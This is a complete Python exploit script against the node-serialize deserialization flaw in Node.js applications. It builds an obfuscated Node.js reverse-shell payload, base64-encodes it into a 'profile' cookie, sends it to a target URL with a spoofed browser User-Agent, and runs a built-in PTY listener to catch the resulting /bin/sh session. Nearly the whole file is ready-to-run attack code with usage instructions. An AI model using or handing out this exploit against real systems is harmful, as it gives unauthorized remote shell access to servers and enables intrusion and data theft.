#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▐ ▄       ·▄▄▄▄  ▄▄▄.▐▄▄▄.▄▄ · ·▄▄▄▄  ▄▄▄..▄▄ · ▄▄▄.▄▄▄  ▄▄▄   ▄▄· ▄▄▄.                                    #
#•█▌▐█▪     ██▪ ██ ▀▄.▀·  ·██▐█ ▀.██▪ ██ ▀▄.▀·▐█ ▀.▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·                                #
#▐█▐▐▌ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄▪▄ ██▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄                              #
#██▐█▌▐█▌.▐▌██.██ ▐█▄▄▌▐▌▐█▌▐█▄▪▐███.██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌                                #
#▀▀ █▪ ▀█▄▀▪▀▀▀▀▀•  ▀▀▀  ▀▀▀• ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀.▀  ▀.▀  ▀·▀▀▀  ▀▀▀                                #
#                                                                                                           #
# nodejs_deser_rce.py - nighter                                                                             #
#                                                                                                           #
# DATE                                                                                                      #
# 05/05/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Untrusted data passed into unserialize() function  in node-serialize module can be exploited              #
# to achieve arbitrary code execution by passing a serialized JavaScript Object with                        #
# an Immediately invoked function expression (IIFE).                                                        #
#                                                                                                           #                                                                                                     #
# Reference                                                                                                 #
# https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################
__author__ = 'nighter@nighter.se'

import termios
import select
import socket
import os
import fcntl
import requests
import base64
import sys
import time

from multiprocessing import Process


class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [[sock, []], [pty, []]]

        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [sock, pty]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]


def BuildNodeJsReverseShell():

    nodejs_rev_shell = '''                                                                                                                                                                                                      
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
   var client = new net.Socket();
   client.connect(PORT, HOST, function() {
      var sh = spawn('/bin/sh',[]);
      client.write("Connected!\\n");
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
      sh.on('exit',function(code,signal){
         client.end("Disconnected!\\n");
      });
   });
   client.on('error', function(e) {
       setTimeout(c(HOST,PORT), TIMEOUT);
   });
}
c(HOST,PORT);
''' % (LHOST, LPORT)

    PAYLOAD = charencode(nodejs_rev_shell)
    return base64.b64encode("%seval(String.fromCharCode(%s))%s" % ("""{"rce":"_$$ND_FUNC$$_function (){""", PAYLOAD, """}()"}"""))


def exploit():

    time.sleep(5)
    cookies = {'profile': BuildNodeJsReverseShell()}
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'}
    r = requests.get('%s' % URL, cookies=cookies, headers=headers)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ▐ ▄       ·▄▄▄▄  ▄▄▄ . ▐▄▄▄.▄▄ · ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄ .▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
•█▌▐█▪     ██▪ ██ ▀▄.▀·  ·██▐█ ▀. ██▪ ██ ▀▄.▀·▐█ ▀. ▀▄.▀·▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▐█▐▐▌ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄▪▄ ██▄▀▀▀█▄▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄▐▀▀▪▄▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██▐█▌▐█▌.▐▌██. ██ ▐█▄▄▌▐▌▐█▌▐█▄▪▐███. ██ ▐█▄▄▌▐█▄▪▐█▐█▄▄▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
▀▀ █▪ ▀█▄▀▪▀▀▀▀▀•  ▀▀▀  ▀▀▀• ▀▀▀▀ ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
""")
        print "Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0])
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print "[+] LHOST = %s" % LHOST
    print "[+] LPORT = %s" % LPORT

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    # Start listener
    s = Shell((LHOST, int(LPORT)), bind=True)
    s.handle()
